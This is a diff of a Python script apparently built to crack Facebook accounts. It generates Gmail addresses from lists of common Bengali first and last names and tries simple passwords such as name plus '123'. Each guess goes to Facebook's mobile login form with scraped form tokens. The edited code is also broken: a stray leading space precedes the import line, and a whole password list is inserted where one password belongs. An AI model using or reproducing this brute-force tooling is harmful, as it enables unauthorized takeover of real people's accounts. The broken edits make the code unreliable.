@@ -1,4 +1,4 @@
-import os,sys,re,time,uuid,json,string,random,base64,platform,pycurl
+ import os,sys,re,time,uuid,json,string,random,base64,platform,pycurl
 from concurrent.futures import ThreadPoolExecutor
 os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
 try:
@@ -934,8 +934,6 @@ def g_clone():
     os.system('clear')
     print(logo)
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
-    first = random.choice(['sumon','rakesh','rahul','raj','joy','pritam','sayan','ramesh','sagar','debraj','avi','abinash','ujjal','rakesh','subho','rakesh','akash','abhijit','abir','aditya','amit','arjun','bapi','basu','bikash','bikram','deep','dev','dipankar','gautam','jaydeb','kamal','lakesh','polash','rajib','sourav','sujay','sujit','anik',])
-    last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','pal','ray',])
     domain = '@gmail.com'
     try:
         limit = int(input(' [:] Crack Limit : '))
@@ -2135,17 +2133,22 @@ def mail(uid,pwx,first,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
+            first = random.choice(['sumon','rakesh','rahul','raj','joy','pritam','sayan','ramesh','sagar','debraj','avi','abinash','ujjal','rakesh','subho','rakesh','akash','abhijit','abir','aditya','amit','arjun','bapi','basu','bikash','bikram','deep','dev','dipankar','gautam','jaydeb','kamal','lakesh','polash','rajib','sourav','sujay','sujit','anik',])
+            last = random.choice(['roy','das','sarkar','mondal','biswas','ghosh','saha','haldar','pal','ray',])
+            nmnn = first+last
+            uiddd = nmnn+love+domain
+            pwg = [nmnn,first+'12',first+'123',first+'1234',first+'12345']
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
+            'email': uiddd,
             'cred_type': '100',
             'login_source': 'device_based_login_add_account',
             'savepass': '',
             'next': '',
             'persistent': '',
-            'encpass':"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            'encpass':"#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pwg),}
             cookies = {
             'ps_n': '1',
             'ps_l': '1',
